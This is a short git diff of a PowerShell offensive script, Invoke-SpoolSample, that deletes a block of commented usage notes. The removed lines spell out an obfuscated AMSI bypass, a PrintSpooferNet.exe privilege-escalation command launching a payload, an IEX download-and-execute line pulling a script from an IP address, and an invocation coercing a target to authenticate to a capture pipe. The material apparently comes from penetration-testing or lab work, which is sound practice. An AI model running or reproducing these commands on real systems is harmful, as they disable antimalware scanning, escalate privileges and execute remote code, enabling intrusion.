@@ -26,13 +26,3 @@ function Invoke-SpoolSample
     $Results = $StringWriter.ToString()
     $Results
 }
-# [Execution] 
-# Disable AMSI 
-# $_0x2Aj21lfA = 'sli','','','tU','','','','is','','','','mA','.','noi','ta','mo','tuA','.','','','tne','','','','','me','gan','aM','.','met','syS'; $_0x2Aj21lfA = -join($_0x2Aj21lfA); $_0x2Aj21lfA = $_0x2Aj21lfA.ToCharArray();[array]::Reverse($_0x2Aj21lfA); $_0x2Aj21lfA = -join($_0x2Aj21lfA); [Ref].Assembly.GetType($_0x2Aj21lfA).GetField($_0x2Aj21lfA.SubString($_0x2Aj21lfA.Length -9, 4).ToLower()+'In'+'itF'+''+''+'ai'+'led','NonPublic,Static').SetValue($null,$true)
-
-# Start PrintSpooferNet.exe 
-# C> C:\PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss "C:\Windows\Tasks\run.exe"
-
-# Load Invoke-SpoolSample
-# PS> IEX(New-Object Net.WebCLient).DownloadString("http://192.168.149.135/Invoke-SpoolSample.ps1")
-# PS> Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>/pipe/test'
